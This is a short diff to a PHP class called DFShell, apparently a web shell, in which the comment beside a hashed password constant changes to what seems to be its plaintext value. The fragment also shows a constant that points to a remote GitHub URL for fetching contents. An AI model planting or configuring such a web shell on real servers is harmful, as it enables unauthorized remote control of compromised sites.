@@ -48,7 +48,7 @@ class DFShell{
     private $clen    = 0;       
     private $error   = false;   
 
-    static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DFS@Malaysia
+    static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
     static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
     
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
